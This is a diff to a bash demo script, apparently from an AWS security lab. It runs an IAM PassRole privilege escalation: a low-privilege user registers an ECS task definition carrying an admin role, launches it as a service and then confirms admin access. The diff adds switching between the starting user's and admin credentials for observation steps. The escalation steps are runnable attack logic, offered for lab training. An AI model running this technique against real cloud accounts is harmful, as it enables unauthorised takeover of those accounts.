@@ -56,13 +56,22 @@ if [ -z "$MODULE_OUTPUT" ]; then
     exit 1
 fi
 
-# Extract credentials from the grouped output
+# Extract starting user credentials from the grouped output
 STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
 STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
 ECS_CLUSTER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.ecs_cluster_name')
 
 if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
+    exit 1
+fi
+
+# Extract admin cleanup credentials for observation/polling steps
+ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
+ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
+
+if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find admin cleanup credentials in terraform output${NC}"
     exit 1
 fi
 
@@ -83,12 +92,22 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user
+# Credential switching helpers
+use_starting_user_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_admin_creds() {
+    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Configure AWS credentials with starting user
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_user_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
@@ -110,7 +129,7 @@ ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 
-# Step 4: Verify we don't have admin permissions yet
+# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
 show_cmd "aws iam list-users --max-items 1"
@@ -121,8 +140,9 @@ else
 fi
 echo ""
 
-# Step 5: Check for attached policies (should have none or minimal)
+# [OBSERVATION] Step 5: Check for attached policies (using admin creds)
 echo -e "${YELLOW}Step 5: Checking current policies attached to starting user${NC}"
+use_admin_creds
 echo "Listing attached policies for: $STARTING_USER"
 ATTACHED_POLICIES=$(aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[*].PolicyName' --output text)
 if [ -z "$ATTACHED_POLICIES" ]; then
@@ -131,8 +151,9 @@ else
     echo "Currently attached policies: $ATTACHED_POLICIES"
 fi
 echo -e "${GREEN}✓ Verified current policy state${NC}\n"
+use_starting_user_creds
 
-# Step 6: Register ECS task definition with admin role (PassRole escalation)
+# [EXPLOIT] Step 6: Register ECS task definition with admin role (PassRole escalation)
 echo -e "${YELLOW}Step 6: Registering ECS task definition with admin role${NC}"
 echo "This is the privilege escalation vector - creating a task that uses the admin role..."
 ADMIN_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${ADMIN_ROLE}"
@@ -197,8 +218,9 @@ else
 fi
 echo ""
 
-# Step 7: Get default VPC and subnet for ECS service
+# [OBSERVATION] Step 7: Get default VPC and subnet for ECS service (using admin creds)
 echo -e "${YELLOW}Step 7: Finding network configuration for ECS service${NC}"
+use_admin_creds
 
 # Get default VPC
 DEFAULT_VPC=$(aws ec2 describe-vpcs \
@@ -230,7 +252,8 @@ fi
 echo "Using Subnet: $DEFAULT_SUBNET"
 echo -e "${GREEN}✓ Network configuration identified${NC}\n"
 
-# Step 8: Create the ECS service
+# [EXPLOIT] Step 8: Create the ECS service
+use_starting_user_creds
 echo -e "${YELLOW}Step 8: Creating ECS service to escalate privileges${NC}"
 echo "Cluster: $ECS_CLUSTER_NAME"
 echo "Task Definition: $TASK_DEFINITION_FAMILY:$TASK_DEF_REVISION"
@@ -259,8 +282,9 @@ else
 fi
 echo ""
 
-# Step 9: Wait for service to launch task and complete
+# [OBSERVATION] Step 9: Wait for service to launch task and complete (using admin creds)
 echo -e "${YELLOW}Step 9: Waiting for ECS service to launch and complete task${NC}"
+use_admin_creds
 echo "Monitoring service status..."
 
 MAX_ATTEMPTS=30
@@ -348,13 +372,13 @@ if [ $ATTEMPT -ge $MAX_ATTEMPTS ]; then
 fi
 echo ""
 
-# Step 10: Wait for IAM policy to propagate
+# [OBSERVATION] Step 10: Wait for IAM policy to propagate
 echo -e "${YELLOW}Step 10: Waiting for IAM policy changes to propagate${NC}"
 echo "IAM changes can take time to propagate across AWS infrastructure..."
 sleep 15
 echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"
 
-# Step 11: Verify policy was attached to starting user
+# [OBSERVATION] Step 11: Verify policy was attached to starting user (using admin creds)
 echo -e "${YELLOW}Step 11: Verifying policy attachment${NC}"
 echo "Checking attached policies for: $STARTING_USER"
 
@@ -378,7 +402,8 @@ else
 fi
 echo ""
 
-# Step 12: Verify admin access
+# [EXPLOIT] Step 12: Verify admin access (using starting user creds - should now have admin)
+use_starting_user_creds
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
